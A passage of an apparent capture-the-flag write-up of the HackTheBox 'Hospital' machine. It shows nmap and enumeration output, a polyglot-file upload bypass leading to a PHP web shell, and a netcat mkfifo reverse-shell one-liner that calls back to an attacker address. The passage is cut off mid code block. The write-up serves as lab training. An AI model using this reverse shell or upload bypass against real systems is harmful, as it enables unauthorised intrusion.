+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># Nmap 7.94SVN scan initiated Sat Jan 20 17:49:14 2024 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN /home/shnks/HTB/Hospital/results/hospital.htb/scans/_quick_tcp_nmap.txt -oX /home/shnks/HTB/Hospital/results/hospital.htb/scans/xml/_quick_tcp_nmap.xml hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report for hospital.htb (10.10.11.241)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up, received user-set (0.026s latency).
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Scanned at 2024-01-20 17:49:15 CET for 291s
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: 980 filtered tcp ports (no-response)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh syn-ack OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEOWkMB0YsRlK8hP9kX0zXBlQ6XzkYCcTXABmN/HBNeupDztdxbCEjbAULKam7TMUf0410Sid7Kw9ofShv0gdQM=
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGH/I0Ybp33ljRcWU66wO+gP/WSw8P6qamet4bjvS10R
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">53/tcp open domain syn-ack Simple DNS Plus
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">88/tcp open kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2024-01-20 23:49:32Z)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp open msrpc syn-ack Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">389/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssl-cert: Subject: commonName=DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Issuer: commonName=DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key type: rsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key bits: 2048
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Signature Algorithm: sha256WithRSAEncryption
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid before: 2023-09-06T10:49:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid after: 2028-09-06T10:49:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MD5: 04b1:adfe:746a:788e:36c0:802a:bdf3:3119
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| -----BEGIN CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[..blablabla.]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_-----END CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">443/tcp open ssl/http syn-ack Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ssl-date: TLS randomness does not represent time
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| http-methods:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ Supported Methods: GET HEAD POST OPTIONS
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssl-cert: Subject: commonName=localhost
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Issuer: commonName=localhost
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key type: rsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key bits: 1024
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Signature Algorithm: sha1WithRSAEncryption
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid before: 2009-11-10T23:48:47
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid after: 2019-11-08T23:48:47
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MD5: a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| -----BEGIN CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|[..blablabla.]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_-----END CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| tls-alpn:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ http/1.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds? syn-ack
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">464/tcp open kpasswd5? syn-ack
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">593/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">636/tcp open ldapssl? syn-ack
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssl-cert: Subject: commonName=DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Issuer: commonName=DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key type: rsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key bits: 2048
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Signature Algorithm: sha256WithRSAEncryption
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid before: 2023-09-06T10:49:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid after: 2028-09-06T10:49:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MD5: 04b1:adfe:746a:788e:36c0:802a:bdf3:3119
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| -----BEGIN CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[..blablabla.]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_-----END CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1801/tcp open msmq? syn-ack
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2103/tcp open msrpc syn-ack Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2105/tcp open msrpc syn-ack Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2107/tcp open msrpc syn-ack Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2179/tcp open vmrdp? syn-ack
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3268/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssl-cert: Subject: commonName=DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Issuer: commonName=DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key type: rsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key bits: 2048
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Signature Algorithm: sha256WithRSAEncryption
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid before: 2023-09-06T10:49:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid after: 2028-09-06T10:49:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MD5: 04b1:adfe:746a:788e:36c0:802a:bdf3:3119
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| -----BEGIN CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[..blablabla.]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_-----END CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3269/tcp open globalcatLDAPssl? syn-ack
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssl-cert: Subject: commonName=DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Issuer: commonName=DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key type: rsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key bits: 2048
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Signature Algorithm: sha256WithRSAEncryption
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid before: 2023-09-06T10:49:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid after: 2028-09-06T10:49:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MD5: 04b1:adfe:746a:788e:36c0:802a:bdf3:3119
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| -----BEGIN CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[..blablabla.]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_-----END CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3389/tcp open ms-wbt-server syn-ack Microsoft Terminal Services
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssl-cert: Subject: commonName=DC.hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Issuer: commonName=DC.hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key type: rsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key bits: 2048
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Signature Algorithm: sha256WithRSAEncryption
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid before: 2023-09-05T18:39:34
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid after: 2024-03-06T18:39:34
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MD5: 0c8a:ebc2:3231:590c:2351:ebbf:4e1d:1dbc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| SHA-1: af10:4fad:1b02:073a:e026:eef4:8917:734b:f8e3:86a7
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| -----BEGIN CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MIIC4jCCAcqgAwIBAgIQJ8MSkg5FM7tDDww5/eWcbjANBgkqhkiG9w0BAQsFADAa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| [..blablabla.]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| zXOe5MnTuI+omoq6zEeUs5It4jL1Yg==
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_-----END CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| rdp-ntlm-info:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Target_Name: HOSPITAL
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| NetBIOS_Domain_Name: HOSPITAL
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| NetBIOS_Computer_Name: DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| DNS_Domain_Name: hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| DNS_Computer_Name: DC.hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| DNS_Tree_Name: hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Product_Version: 10.0.17763
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ System_Time: 2024-01-20T23:53:25+00:00
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">8080/tcp open http syn-ack Apache httpd 2.4.55 ((Ubuntu))
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-open-proxy: Proxy might be redirecting requests
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-server-header: Apache/2.4.55 (Ubuntu)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| http-methods:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ Supported Methods: GET HEAD POST OPTIONS
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| http-title: Login
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_Requested resource was login.php
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| http-cookie-flags:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| /:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| PHPSESSID:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ httponly flag not set
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: Hosts: DC, www.example.com; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Meanwhile I did gobuster to enumerate, and I seen 3 other subdomain&lt;/p>
+&lt;p>&lt;code>gobuster dns -d hospital.htb -r hospital.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image.png"
+width="1234"
+height="527"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image_hu2e4310c3ecd6ca1f8d9be258a54346c9_84955_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image_hu2e4310c3ecd6ca1f8d9be258a54346c9_84955_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="234"
+data-flex-basis="561px"
+>&lt;/p>
+&lt;p>We also run a path enumeration with dirsearch to find our first entry point. Other port enumerations yielded no fruitful results, no users for ASREPRoastable enumeration, LDAP enumeration impossible (both null and anonymous sessions), no transfers on port 53, and IPv6 address can be disregarded.&lt;/p>
+&lt;p>&lt;code>dirsearch -u http://dc.hospital.htb:8080 --exclude-status 400,401,402,403,404,500,501,502,503,504&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-2.png"
+width="952"
+height="631"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-2_hu97f203f4532b51abbcb223fe0dee8f78_153251_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-2_hu97f203f4532b51abbcb223fe0dee8f78_153251_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="150"
+data-flex-basis="362px"
+>&lt;/p>
+&lt;p>Port 443 is open, but after multiple attempts to bypass authentication, reading code, we&amp;rsquo;ll leave it for later. It may prove useful in the future.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-8.png"
+width="1819"
+height="605"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-8_hu082ae2f37fc5ba4853b066807d6235c3_41086_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-8_hu082ae2f37fc5ba4853b066807d6235c3_41086_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Port 443"
+class="gallery-image"
+data-flex-grow="300"
+data-flex-basis="721px"
+>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-1.png"
+width="1901"
+height="699"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-1_hu5847c4d6becd6f491397024ced5809b2_659115_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-1_hu5847c4d6becd6f491397024ced5809b2_659115_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="271"
+data-flex-basis="652px"
+>&lt;/p>
+&lt;p>Once connected, we can upload files, which seems promising as it&amp;rsquo;s the only functionality available after login. This appears to be the only path forward.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-3.png"
+width="1896"
+height="754"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-3_hu88e9b2af2ddeb7131c0a3d5d937d8448_775776_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-3_hu88e9b2af2ddeb7131c0a3d5d937d8448_775776_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="251"
+data-flex-basis="603px"
+>&lt;/p>
+&lt;p>When uploading a PNG, GIF, or JPEG file, we&amp;rsquo;re redirected to &lt;strong>success.php.&lt;/strong>; otherwise, to .&lt;strong>failed.php.&lt;/strong>&lt;br>
+After some research, we can bypass this with what&amp;rsquo;s known as a &lt;em>&amp;ldquo;polyglot file&amp;rdquo;.&lt;/em>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-4.png"
+width="1460"
+height="709"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-4_hub988252a687ca998cda4defd31c0050e_96581_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-4_hub988252a687ca998cda4defd31c0050e_96581_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="205"
+data-flex-basis="494px"
+>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-5.png"
+width="1598"
+height="750"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-5_hu7e8826c03464de5cf6ddc77e86b3fd89_107018_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-5_hu7e8826c03464de5cf6ddc77e86b3fd89_107018_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="213"
+data-flex-basis="511px"
+> aussi pour extension phps / pgif&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-7.png"
+width="1194"
+height="458"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-7_hude54d970e1a8d2400ec21d9173a49385_68107_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-7_hude54d970e1a8d2400ec21d9173a49385_68107_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="260"
+data-flex-basis="625px"
+>&lt;/p>
+&lt;p>These article help me a lot : &lt;br>
+&lt;a class="link" href="https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology" target="_blank" rel="noopener"
+>https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a" target="_blank" rel="noopener"
+>https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a&lt;/a>&lt;/p>
+&lt;p>After injecting a PHP reverse shell, it was impossible to establish an incoming connection from the machine.
+Due to I/O error system&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-9.png"
+width="1880"
+height="343"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-9_hu8df1c61004781422a1c252e19c900ba1_203501_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-9_hu8df1c61004781422a1c252e19c900ba1_203501_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="548"
+data-flex-basis="1315px"
+>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-6.png"
+width="1755"
+height="384"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-6_huf03952c3233f10791dbc10a3433cb2c9_68294_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-6_huf03952c3233f10791dbc10a3433cb2c9_68294_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="457"
+data-flex-basis="1096px"
+>&lt;/p>
+&lt;p>&lt;a class="link" href="https://medium.com/@tushar_rs_/remote-command-execution-through-file-upload-rce-3e72cb178bb8" target="_blank" rel="noopener"
+>https://medium.com/@tushar_rs_/remote-command-execution-through-file-upload-rce-3e72cb178bb8&lt;/a> &amp;ndash;&amp;gt; &lt;a class="link" href="https://github.com/flozz/p0wny-shell" target="_blank" rel="noopener"
+>https://github.com/flozz/p0wny-shell&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://medium.com/@tushar_rs_/remote-command-execution-through-file-upload-rce-3e72cb178bb8" target="_blank" rel="noopener"
+>https://medium.com/@tushar_rs_/remote-command-execution-through-file-upload-rce-3e72cb178bb8&lt;/a>&lt;/p>
+&lt;p>However, an IO problem becomes evident from the screenshot, rendering the attainment of a reverse shell unattainable. Consequently, we opt to employ P0nyshell to address this issue effectively.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-10.png"
+width="1315"
+height="612"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-10_hu4ac3766ea9f61b94e7d62dd9c7342f80_76858_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-10_hu4ac3766ea9f61b94e7d62dd9c7342f80_76858_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="214"
+data-flex-basis="515px"
+>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-11.png"
+width="1885"
+height="769"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-11_hud7038aec72d894c742fb790ddb214c57_51009_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-11_hud7038aec72d894c742fb790ddb214c57_51009_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="245"
+data-flex-basis="588px"
+>&lt;/p>
+&lt;h2 id="first-foothold">First FootHold&lt;/h2>
+&lt;p>Ww executed this command and get reverse shell !&lt;/p>
+&lt;p>&lt;code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.22 1234 &amp;gt;/tmp/f&lt;/code>&lt;/p>
+&lt;p>After establishing connectivity, my initial reflex is to examine any configuration files associated with the service on port 443 discovered earlier. However, upon reflection, this approach seems misguided, as the machine is identified as Windows based on the Nmap scan results. Consequently, we abandon this line of inquiry.&lt;/p>
+&lt;p>&lt;code>www-data@webserver:/var/www/html$ find / -name webmail 2&amp;gt;/dev/null www-data@webserver:/var/www/html$ find / -name roundcube 2&amp;gt;/dev/null&lt;/code> &amp;ndash;&amp;gt; nothing&lt;/p>
+&lt;p>Though credentials for MySQL are discovered early on, attempts to connect to it prove futile, hinting at the possibility of a potential rabbit hole.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
